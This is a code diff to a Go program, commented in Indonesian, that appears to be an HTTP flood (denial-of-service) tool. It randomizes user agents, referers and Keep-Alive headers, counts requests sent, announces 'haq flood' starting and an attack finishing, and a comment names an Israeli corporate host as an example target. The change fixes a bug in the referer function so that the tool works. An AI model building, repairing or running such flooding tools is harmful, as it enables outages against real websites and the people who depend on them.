@@ -144,7 +144,8 @@ func getRandomUserAgent() string {
 	return userAgents[rand.Intn(len(userAgents))]
 }
 
-func getRandomReferer() string {
+// Tambahkan parameter 'state' ke fungsi ini
+func getRandomReferer(state *AttackState) string {
 	ref := referers[rand.Intn(len(referers))]
 	// Ambil host dari referer (misal: "http://google.com/?q=" -> "google.com")
 	refHostMatch := regexp.MustCompile(`^https?://([^/:]+)`)
@@ -154,7 +155,7 @@ func getRandomReferer() string {
 	}
 
 	// Ambil host dari state (misal: "corporation.co.il:443" -> "corporation.co.il")
-	currentStateHost := strings.Split(s.host, ":")[0] // Abaikan port jika ada
+	currentStateHost := strings.Split(state.host, ":")[0] // Abaikan port jika ada
 
 	if refHost != "" && refHost == currentStateHost {
 		// Jika host dari referer cocok dengan host target, tambahkan path acak
@@ -181,7 +182,8 @@ func createHTTPRequest(targetURL string, host string, state *AttackState) (*http
 	req.Header.Set("User-Agent", getRandomUserAgent())
 	req.Header.Set("Cache-Control", "no-cache")
 	req.Header.Set("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7")
-	req.Header.Set("Referer", getRandomReferer())
+	// Panggil getRandomReferer dengan parameter state
+	req.Header.Set("Referer", getRandomReferer(state))
 	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(keepAliveMax-keepAliveMin+1)+keepAliveMin))
 	req.Header.Set("Connection", "keep-alive")
 	req.Header.Set("Host", host) // Gunakan host:port yang asli
@@ -376,7 +378,7 @@ func main() {
 	if state.debugMode {
 		fmt.Println("[INFO] Mode debug diaktifkan.")
 	}
-	fmt.Println("[INFO]======= haq flood mulai .............")
+	fmt.Println("[INFO] ========== haq flood mulai ......")
 
 	var wg sync.WaitGroup
 
@@ -395,5 +397,5 @@ func main() {
 	}
 
 	fmt.Printf("\n[INFO] Total request terkirim: %d\n", state.requestCounter.Load())
-	fmt.Println("[INFO] -- Serangan Selesai --")
+	fmt.Println("[INFO] -- Selesai --")
 }
